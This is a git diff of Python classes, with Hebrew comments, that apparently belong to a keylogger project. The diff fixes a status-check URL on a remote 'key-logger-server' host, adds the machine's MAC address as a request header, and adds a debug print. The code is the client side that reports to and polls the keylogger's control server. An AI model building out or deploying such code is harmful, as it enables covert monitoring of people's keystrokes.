@@ -26,6 +26,7 @@ class StatusUpdater(APIServer):
 
         url = "https://key-logger-server.onrender.com/api/status/update"
         try:
+            print("status_data", status_data)
             response = requests.post(url, json=status_data)
             response.raise_for_status()  # הרם שגיאה עבור קודי סטטוס שגיאה (4xx או 5xx)
             print(f"------------ הודעה נשלחה בהצלחה ----------------\n {status_data}")
@@ -63,11 +64,21 @@ class StatusChecker(APIServer):
 
         :return: תגובת השרת (requests.Response).
         """
-        url = "https://key-logger-server.onrender.com/api/status/chec"  # החלף בכתובת ה-URL האמיתית
+        url = "https://key-logger-server.onrender.com/api/status/check"  # החלף בכתובת ה-URL האמיתית
+
         try:
-            response = requests.get(url)
+            # הנחת עבודה שיש self.mac_address השמור במחלקה / באובייקט.
+            # אם אין, ניתן להגדיר משתנה mac_address באופן אחר.
+            headers = {"mac-address": mac_address}
+
+            # שליחת בקשה GET לשרת עם ההדר שמכיל את ה-MAC
+            response = requests.get(url, headers=headers)
+
+            # raise_for_status מוודא שלא חזר קוד תקלה (4XX או 5XX);
+            # במידה ויש שגיאה תיזרק החרגה
             response.raise_for_status()
-            return response
+
+            return response  # נחזיר את תגובת השרת לקריאה נוספת במקום אחר בקוד
         except requests.exceptions.RequestException as e:
             print(f"שגיאה בבדיקת שינויי סטטוס: {e}")
             return None
@@ -83,7 +94,7 @@ class RequestManager:
         self.data_file_writer = DataFileWriter()
         self.status_checker = StatusChecker()
 
-    def handle_request(self, method, request_type, kwargs = None):
+    def handle_request(self, method, request_type, kwargs=None):
         """
         מטפל בבקשה ומנתב אותה למחלקה המתאימה.
 
